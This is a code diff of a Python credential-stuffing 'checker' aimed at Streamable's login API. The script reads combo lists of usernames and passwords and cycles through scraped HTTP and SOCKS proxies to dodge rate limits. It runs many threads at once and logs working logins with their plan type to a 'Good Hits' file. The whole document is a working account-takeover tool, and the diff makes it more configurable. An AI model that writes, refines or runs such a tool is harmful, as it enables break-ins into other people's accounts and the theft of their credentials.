@@ -1,69 +1,71 @@
 import datetime
-import random
-from concurrent.futures import ThreadPoolExecutor
+from random import choice
+import concurrent.futures
 import requests
 
-x = datetime.datetime.now()
+start_time = datetime.datetime.now()
 
 
-def get_proxies():
-    url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
+def get_proxies(proxy_type):
+    url = f"https://api.proxyscrape.com/v2/?request=getproxies&protocol={proxy_type}&timeout=10000&country=all&ssl=all&anonymity=all"
     r = requests.get(url).text.split()
     return r
 
 
-proxy_list = get_proxies()
+def random_proxy(proxy_type):
+    if proxy_type == 'socks4':
+        proxy = choice(proxies)
+        return {"http": f'socks4://{proxy}', 'https': f'socks4://{proxy}'}
+
+    elif proxy_type == 'socks5':
+        proxy = choice(proxies)
+        return {"http": f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
+
+    elif proxy_type == 'http':
+        proxy = choice(proxies)
+        return {"http": f'http://{proxy}', 'https': f'http://{proxy}'}
 
 
-def get_random_proxy():
-    return {"http": f'http://{random.choice(proxy_list)}', 'https': f'http://{random.choice(proxy_list)}'}
+def write_to_file(**kwargs):
+    open(f'Results\\[Good Hits] {start_time.strftime("%d-%m-%y %I-%M-%S-%p")}.txt', 'a').write(
+        f"{' '.join('='.join(tup) for tup in kwargs.items())}\n"
+        f"[=======Checker By Henry Richard=======]\n"
+    )
 
 
-def proxy_request(type, url, **kwargs):
+def proxy_request(request_type, url, **kwargs):
     session = requests.session()
     while 1:
         try:
-            proxy = get_random_proxy()
-            r = session.request(type, url, proxies=proxy, timeout=5, **kwargs).json()
+            proxy = random_proxy(proxy_type_)
+            r = session.request(request_type, url, proxies=proxy, timeout=5, **kwargs).json()
             break
         except:
             pass
     return r
 
 
-def checker(combo):
-    email = combo.split(":")[0]
-    password = combo.split(":")[1]
-
+def checker(combo: str):
+    username, password = combo.split(":")
     url = 'https://ajax.streamable.com/check'
     post_data = {
-        "username": email,
+        "username": username,
         "password": password
     }
-
     r = proxy_request('post', url, json=post_data)
 
     if "ad_tags" in r:
-        print(f"[GOOD] {email}:{password} Plan={r['plan_name']}")
-        write_to_file(email, password, r['plan_name'])
+        print(f"[GOOD] {username}:{password} Plan={r['plan_name']}")
+        write_to_file(Email=username, Password=password, Plan=r['plan_name'])
     else:
-        print(f"[BAD] {email}:{password}")
-
-
-combos = open('combos.txt').read().split()
-
-
-def write_to_file(email, password, account_type):
-    open(f'Results\\[Good Hits] {x.strftime("%d-%m-%y %I-%M-%S-%p")}.txt', 'a').write(
-        f'{email}:{password} Plan={account_type}'
-    )
-
-
-def main():
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(checker, combo) for combo in combos]
-        executor.shutdown(wait=True)
+        print(f"[BAD] {username}:{password}")
 
 
 if __name__ == '__main__':
-    main()
+    threads = int(input('Amount Of Threads: '))
+    combos = open(input('Combos Path: '), 'r').read().split()
+    proxy_type_ = input('Proxy').lower()
+    proxies = get_proxies(proxy_type_)
+
+    with concurrent.futures.ThreadPoolExecutor(threads) as executor:
+        executor.map(checker, combos)
